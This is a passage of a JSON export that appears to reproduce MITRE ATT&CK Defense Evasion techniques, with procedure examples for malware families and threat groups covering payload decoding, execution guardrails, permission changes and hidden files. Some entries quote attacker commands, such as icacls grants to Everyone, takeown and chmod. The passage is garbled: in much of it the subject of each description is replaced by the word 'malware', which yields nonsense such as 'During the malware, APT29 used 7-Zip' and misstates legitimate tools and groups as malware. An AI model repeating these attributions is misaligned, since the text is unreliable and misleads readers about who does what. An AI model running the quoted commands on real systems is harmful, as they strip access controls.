                "Description": "malware deobfuscates its code.[236]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware can decode its second-stage PowerShell script prior to execution.[237]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used 7-Zip to decode their Raindrop malware.[201]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can run upload to decrypt and upload files from storage.[68][99]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware can decode and decrypt exfiltrated data sent to C2.[238]"
            },
            "S0543": {
                "ID": "S0543",
                "Name": "Spark",
                "Description": "malware has used a custom XOR algorithm to decrypt the payload.[239]"
            },
            "S0390": {
                "ID": "S0390",
                "Name": "SQLRat",
                "Description": "malware has scripts that are responsible for deobfuscating additional scripts.[240]"
            },
            "S1030": {
                "ID": "S1030",
                "Name": "Squirrelwaffle",
                "Description": "malware has decrypted files and payloads using a XOR-based algorithm.[241][242]"
            },
            "S0188": {
                "ID": "S0188",
                "Name": "Starloader",
                "Description": "malware decrypts and executes shellcode from a file called Stars.jps.[243]"
            },
            "S1112": {
                "ID": "S1112",
                "Name": "STEADYPULSE",
                "Description": "malware can URL decode key/value pairs sent over C2.[235]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware decrypts resources that are loaded into memory and executed.[244]"
            },
            "S0562": {
                "ID": "S0562",
                "Name": "SUNSPOT",
                "Description": "malware decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs.[245]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can deobfuscate packed binaries in memory.[123]"
            },
            "G0092": {
                "ID": "G0092",
                "Name": "TA505",
                "Description": "malware has decrypted packed DLLs with an XOR key.[246]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware can use a stream cipher to decrypt stings used by the malware.[247]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has used a script that decodes a Base64-encoded version of WeaveWorks Scope.[248]"
            },
            "S0560": {
                "ID": "S0560",
                "Name": "TEARDROP",
                "Description": "malware was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload.[249][250][202]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "During execution, malware malware deobfuscates and decompresses code that was encoded with Metasploit\u2019s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[251]"
            },
            "S0665": {
                "ID": "S0665",
                "Name": "ThreatNeedle",
                "Description": "malware can decrypt its payload using RC4, AES, or one-byte XORing.[252]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware has used XOR and Base64 to decode C2 data.[253]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware decodes the configuration data and modules.[254][255][256]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware used shellcode with an XOR algorithm to decrypt a payload. malware also decrypted image files which contained a payload.[257][258]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware has the ability to decrypt, load, and execute a DLL and its resources.[259]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.[260]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.[261]"
            },
            "S0263": {
                "ID": "S0263",
                "Name": "TYPEFRAME",
                "Description": "One malware variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".[262]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.[263]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.[264]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has the ability to decode and decrypt downloaded files.[265][266]"
            },
            "S0636": {
                "ID": "S0636",
                "Name": "VaporRage",
                "Description": "malware can deobfuscate XOR-encoded shellcode prior to execution.[36]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware decrypts code, strings, and commands to use once it's on the victim's machine.[267]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware deobfuscates its strings and APIs once its executed.[268]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can use XOR 0x45 to decrypt obfuscated code.[269]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.[270]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware has the ability to decrypt its RC4 encrypted payload for execution.[271]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware can decompress scripts received from C2.[272]"
            },
            "S0514": {
                "ID": "S0514",
                "Name": "WellMess",
                "Description": "malware can decode and decrypt data received from C2.[273][274][275]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.[276][277]"
            },
            "S0466": {
                "ID": "S0466",
                "Name": "WindTail",
                "Description": "malware has the ability to decrypt strings using hard-coded AES keys.[278]"
            },
            "S0430": {
                "ID": "S0430",
                "Name": "Winnti for Linux",
                "Description": "malware has decoded XOR encoded strings holding its configuration upon execution.[279]"
            },
            "S0141": {
                "ID": "S0141",
                "Name": "Winnti for Windows",
                "Description": "The malware dropper can decrypt and decompresses a data blob.[280]"
            },
            "S1115": {
                "ID": "S1115",
                "Name": "WIREFIRE",
                "Description": "malware can decode, decrypt, and decompress data received in C2 HTTP POST requests.[281]"
            },
            "G0090": {
                "ID": "G0090",
                "Name": "WIRTE",
                "Description": "malware has used Base64 to decode malicious VBS script.[282]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can deobfuscate Base64-encoded strings and scripts.[283]"
            },
            "S0653": {
                "ID": "S0653",
                "Name": "xCaon",
                "Description": "malware has decoded strings from the C2 server before executing commands.[284]"
            },
            "S0388": {
                "ID": "S0388",
                "Name": "YAHOYAH",
                "Description": "malware decrypts downloaded files before execution.[285]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware decodes its secondary payload and writes it to the victim\u2019s machine. malware also uses AES and XOR to decrypt strings and payloads.[286][287]"
            },
            "S0230": {
                "ID": "S0230",
                "Name": "ZeroT",
                "Description": "malware shellcode decrypts and decompresses its RC4-encrypted payload.[288]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware decrypts strings in the code during the execution process.[289]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.[290]"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware has used a XOR key to decrypt strings.[291]"
            }
        }
    },
    "T1006": {
        "ttp_name": "Direct Volume Access",
        "ttp_id": "T1006",
        "href": "/techniques/T1006",
        "tactic": "Defense Evasion",
        "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. [1]Utilities, such as NinjaCopy, exist to perform these actions in PowerShell.[2] Adversaries may also use built-in or third-party utilities (such as vssadmin, wbadmin, and esentutl) to create shadow copies or backups of data from system volumes.[3]",
        "Procedure": {
            "S0404": {
                "ID": "S0404",
                "Name": "esentutl",
                "Description": "malware can use the Volume Shadow Copy service to copy locked files such as ntds.dit.[3][4]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has created volume shadow copies of virtual domain controller disks to extract the NTDS.dit file.[5]"
            }
        }
    },
    "T1480": {
        "ttp_name": "Execution Guardrails",
        "ttp_id": "T1480",
        "href": "/techniques/T1480",
        "subtechnique": {
            "001": {
                "name": "Environmental Keying",
                "href": "/techniques/T1480/001",
                "description": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.[1]Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.[2][3][4][5][6] By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.[2][6] These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).Similar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.[2][4][5][6][7] By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.[2] This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.Like other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. <name> has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.[8]"
                    },
                    "G0020": {
                        "ID": "G0020",
                        "Name": "Equation",
                        "Description": "<name> has been observed utilizing environmental keying in payload delivery.[2][9]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can use Data Protection API to encrypt its components on the victim\u2019s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.[10]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> can store its final payload in the Registry under $HKLM\\SOFTWARE\\Classes\\Interface\\ encrypted with a dynamically generated key based on the drive\u2019s serial number.[11]"
                    },
                    "S0685": {
                        "ID": "S0685",
                        "Name": "PowerPunch",
                        "Description": "<name> can use the volume serial number from a target host to generate a unique XOR key for the next stage payload.[12]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> relies on a specific victim hostname to execute and decrypt important strings.[13]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "The <name> dropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key.[14]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign.[1] Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.[2]Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",
        "Procedure": {
            "S0504": {
                "ID": "S0504",
                "Name": "Anchor",
                "Description": "malware can terminate itself if specific execution flags are not present.[3]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware compares file names and paths to a list of excluded names and directory names during encryption.[4]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware can check its current working directory and for the presence of a specific file and terminate if specific values are not found.[5]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware uses per-victim links for hosting malicious archives, such as ZIP files, in services such as SharePoint to prevent other entities from retrieving them.[6]"
            },
            "S1052": {
                "ID": "S1052",
                "Name": "DEADEYE",
                "Description": "malware can ensure it executes only on intended systems by identifying the victim's volume serial number, hostname, and/or DNS domain.[7]"
            },
            "S0634": {
                "ID": "S0634",
                "Name": "EnvyScout",
                "Description": "malware can call window.location.pathname to ensure that embedded files are being executed from the C: drive, and will terminate if they are not.[5]"
            },
            "S0637": {
                "ID": "S0637",
                "Name": "NativeZone",
                "Description": "malware can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.[5][8]"
            },
            "S1035": {
                "ID": "S1035",
                "Name": "Small Sieve",
                "Description": "malware can only execute correctly if the word Platypus is passed to it on the command line.[9]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met.[10]"
            },
            "S0562": {
                "ID": "S0562",
                "Name": "SUNSPOT",
                "Description": "malware only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values.[11]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware is only delivered to a compromised host if the victim's IP address is on an allow-list.[12]"
            },
            "S0636": {
                "ID": "S0636",
                "Name": "VaporRage",
                "Description": "malware has the ability to check for the presence of a specific DLL and terminate if it is not found.[5]"
            }
        }
    },
    "T1211": {
        "ttp_name": "Exploitation for Defense Evasion",
        "ttp_id": "T1211",
        "href": "/techniques/T1211",
        "tactic": "Defense Evasion",
        "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries [1], evade security logs [2], or deploy hidden infrastructure.[3]",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used CVE-2015-4902 to bypass security features.[4][5]"
            }
        }
    },
    "T1222": {
        "ttp_name": "File and Directory Permissions Modification",
        "ttp_id": "T1222",
        "href": "/techniques/T1222",
        "subtechnique": {
            "001": {
                "name": "Windows File and Directory Permissions Modification",
                "href": "/techniques/T1222/001",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2] File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).[3] Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.[4]Adversaries can interact with the DACLs using built-in Windows commands, such as icacls, cacls, takeown, and attrib, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
                "Procedure": {
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> can use icacls /reset and takeown /F to reset a targeted executable's permissions and then take ownership.[5]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> can use Windows commands such as fsutil behavior set SymLinkEvaluation R2L:1 to redirect file system access to a different location after gaining access into compromised networks.[6]"
                    },
                    "S0693": {
                        "ID": "S0693",
                        "Name": "CaddyWiper",
                        "Description": "<name> can modify ACL entries to take ownership of files.[7]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can modify the binary ACL to prevent security tools from running.[8]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> can use the command-line utility cacls.exe to change file permissions.[9]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> can launch icacls  /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.[10]"
                    },
                    "S0366": {
                        "ID": "S0366",
                        "Name": "WannaCry",
                        "Description": "<name> uses attrib +h and icacls . /grant Everyone:F /T /C /Q to make some of its files hidden and grant all users full access controls.[11]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> has a command to take ownership of a file and reset the ACL permissions using the takeown.exe /F filepath command.[12]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.[13]"
                    }
                }
            },
            "002": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "href": "/techniques/T1222/002",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2] File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode).Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.[3]",
                "Procedure": {
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name>'s macOS backdoor changes the permission of the file it wants to execute to 755.[4]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "The <name> binary can use chmod to gain full permissions to targeted files.[5]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> changes the permissions of a payload using the command chmod -R 755.[3]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> will set the GID of httpsd to 90 when infected.[6]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> gives all users execute permissions for the application using the command chmod +x /Users/Shared/AppStore.app.[7]"
                    },
                    "S0599": {
                        "ID": "S0599",
                        "Name": "Kinsing",
                        "Description": "<name> has used chmod to modify permissions on key files for use.[8]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> can use the chmod utility to set a file as executable, such as chmod 777 or chmod +x.[3][9][10]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> has changed permissions of a second-stage payload to an executable via chmod.[11]"
                    },
                    "S0598": {
                        "ID": "S0598",
                        "Name": "P.A.S. Webshell",
                        "Description": "<name> has the ability to modify file permissions.[12]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> can add the executable flag to a downloaded file.[13]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has changed file permissions of files so they could not be modified.[14]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has modified the permissions on binaries with chattr.[15][16]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> uses the chmod +x command to grant executable permissions to the malicious file.[3]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2] File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.[3][4][5][6][7]",
        "Procedure": {}
    },
    "T1564": {
        "ttp_name": "Hide Artifacts",
        "ttp_id": "T1564",
        "href": "/techniques/T1564",
        "subtechnique": {
            "001": {
                "name": "Hidden Files and Directories",
                "href": "/techniques/T1564/001",
                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls \u2013a for Linux and macOS).On Linux and Mac, users can mark specific files as hidden simply by putting a \".\" as the first character in the file or folder name  [1] [2]. Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \"ls\". Users must specifically change settings to have these files viewable.Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app [3]. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has created hidden folders.[4]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has added a leading . to plist filenames, unlisting them from the Finder app and default Terminal directory listings.[5]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has saved files with hidden file attributes.[6][6]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name>'s macOS backdoor hides the clientID file via a chflags function.[7]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.[8]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has the ability to set folders or files to be hidden from the Windows Explorer default view.[9]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> uses a hidden directory named .calisto to store data from the victim\u2019s machine before exfiltration.[10][11]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has created a hidden file in the Startup folder of the current user.[12]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> has created a hidden directory on targeted systems, naming it after the current local time (year, month, and day).[13]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> has the ability to set its file attributes to hidden.[14]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> creates and installs itself to a hidden installation directory.[15]"
                    },
                    "S0369": {
                        "ID": "S0369",
                        "Name": "CoinTicker",
                        "Description": "<name> downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].[16]"
                    },
                    "S0497": {
                        "ID": "S0497",
                        "Name": "Dacls",
                        "Description": "<name> has had its payload named with a dot prefix to make it hidden from view in the Finder application.[17][18]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> initial installation involves dropping several files to a hidden directory named after the victim machine name.[19]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> can use hidden directories and files to hide malicious executables.[20]"
                    },
                    "S0569": {
                        "ID": "S0569",
                        "Name": "Explosive",
                        "Description": "<name> has commonly set file and path attributes to hidden.[21]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has created hidden files and folders within a compromised Linux system /tmp directory. <name> also has used attrib.exe to hide gathered local host information.[22][23]"
                    },
                    "S0277": {
                        "ID": "S0277",
                        "Name": "FruitFly",
                        "Description": "<name> saves itself with a leading \".\" to make it a hidden file.[24]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has hidden files on a compromised host.[25]"
                    },
                    "S0278": {
                        "ID": "S0278",
                        "Name": "iKitten",
                        "Description": "<name> saves itself with a leading \".\" so that it's hidden from users by default.[24]"
                    },
                    "S0434": {
                        "ID": "S0434",
                        "Name": "Imminent Monitor",
                        "Description": "<name> has a dynamic debugging feature to set the file attribute to hidden.[26]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can create hidden system directories.[27]"
                    },
                    "S0015": {
                        "ID": "S0015",
                        "Name": "Ixeshe",
                        "Description": "<name> sets its own executable file's attributes to hidden.[28]"
                    },
                    "S0162": {
                        "ID": "S0162",
                        "Name": "Komplex",
                        "Description": "The <name> payload is stored in a hidden directory at /Users/Shared/.local/kextd.[1]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.[29][17][18][30]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has the ability to copy itself to a hidden file and directory.[31]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> has set the attributes of the VirtualBox directory and VBoxVmService parent directory to \"hidden\".[32]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has used malware to store malicious binaries in hidden directories on victim's USB drives.[33]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has the capability to exfiltrate stolen data to a hidden folder on a removable drive.[34]"
                    },
                    "S0282": {
                        "ID": "S0282",
                        "Name": "MacSpy",
                        "Description": "<name> stores itself in ~/Library/.DS_Stores/ [35]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.[36]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name>'s PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data.[37]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can copy itself to and launch itself from hidden folders.[38]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "Before exfiltration, <name>'s backdoor has used hidden files to store logs and outputs from backdoor commands.[39]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> has executed a .command script from a hidden directory in a mounted DMG.[40]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> sets the main loader file\u2019s attributes to hidden.[41]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> can modify the characteristics of folders to hide them from the compromised user.[42]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has the ability to hide and unhide files.[43]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has placed its payload in hidden subdirectories.[44]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> has the ability to set file attributes to \"hidden\" to hide files from the compromised user's view in Windows File Explorer.[45]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "<name> can modify file attributes to hide files.[46]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> downloaded a file \"libprocesshider\", which could hide files on the target system.[47][48]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
